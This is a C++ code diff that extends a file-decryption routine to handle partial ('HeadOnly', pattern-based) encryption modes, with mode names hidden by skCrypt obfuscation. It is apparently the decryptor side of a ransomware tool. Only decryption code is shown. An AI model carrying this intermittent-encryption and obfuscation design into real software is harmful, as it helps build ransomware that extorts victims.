@@ -68,8 +68,35 @@ void DecryptFiles(const vector<string>& files, const string& key, const string& 
         ifstream fin(file, ios::in);
         string data((istreambuf_iterator<char>(fin)), istreambuf_iterator<char>());
         fin.close();
-        vector<BYTE> content = base64_decode(aes_decrypt(key, data, iv));
-        
+
+        vector<BYTE> content;
+
+        if (ENCRYPTION_MODE == (string)skCrypt("HeadOnly")) {
+            vector<string> dataSplitted = Split(data, '\n');
+            content = base64_decode(aes_decrypt(key, dataSplitted[0], iv));
+            if (dataSplitted.size() > 1) {
+                vector<BYTE> tempBucket = base64_decode(dataSplitted[1]);
+                content.insert(content.end(), tempBucket.begin(), tempBucket.end());
+            }
+        }
+        else if (ENCRYPTION_MODE == (string)skCrypt("DotPattern") ||
+            ENCRYPTION_MODE == (string)skCrypt("SmartPattern") ||
+            ENCRYPTION_MODE == (string)skCrypt("AdvancedSmartPattern")
+            ) {
+            vector<string> dataSplitted = Split(data, '\n');
+            for (int i = 0; i < dataSplitted.size() - 1; i++) {
+                vector<BYTE> tmpBucket;
+                if (i == 0 || i % 2 != 0)
+                    tmpBucket = base64_decode(aes_decrypt(key, dataSplitted[i], iv));
+                else
+                    tmpBucket = base64_decode(dataSplitted[i]);
+                content.insert(content.end(), tmpBucket.begin(), tmpBucket.end());
+            }
+        }
+        else
+            content = base64_decode(aes_decrypt(key, data, iv));
+
+
         string newFileName = "";
         for (int i = 0; i < file.size() - (FILE_EXTENSION).size(); i++)
             newFileName += file[i];
